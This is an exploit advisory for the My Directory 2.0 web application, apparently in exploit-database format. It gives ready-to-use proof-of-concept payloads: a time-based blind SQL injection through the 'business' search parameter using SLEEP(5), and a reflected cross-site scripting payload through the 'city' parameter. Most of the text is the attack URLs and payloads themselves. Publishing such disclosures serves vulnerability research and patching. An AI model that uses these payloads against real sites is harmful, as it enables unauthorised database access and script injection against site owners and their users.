@@ -1,0 +1,30 @@
+# Exploit Title: My Directory 2.0 - SQL Injection / Cross-Site Scripting
+# Dork: N/A
+# Date: 27.05.2018
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Vendor Homepage: https://codecanyon.net/item/my-directory/15859886
+# Version: 2.0
+# Category: Webapps
+# Tested on: Kali linux
+# Description : The vulnerability allows an attacker to inject sql commands
+from the user search section with 'business' parameter.
+Another parameter 'city', has XSS vulnerability.
+====================================================
+
+# PoC : SQLi :
+
+Parameter: business (GET)
+
+    Type: AND/OR time-based blind
+    Demo:
+http://site.com/SearchResult/result?city=test&business=test&from_type=&latitude=&image=&rating=&longitude=&place_id=
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: city=test&business=test%' AND SLEEP(5) AND
+'%'='&from_type=&latitude=&image=&rating=&longitude=&place_id=
+
+====================================================
+
+# PoC : XSS :
+
+  Payload :
+http://site.com/SearchResult/result?city=%3E%27%3E%22%3E%3Cimg%20src=x%20onerror=alert%280%29%3E&business=test&from_type=&latitude=&image=&rating=&longitude=&place_id=
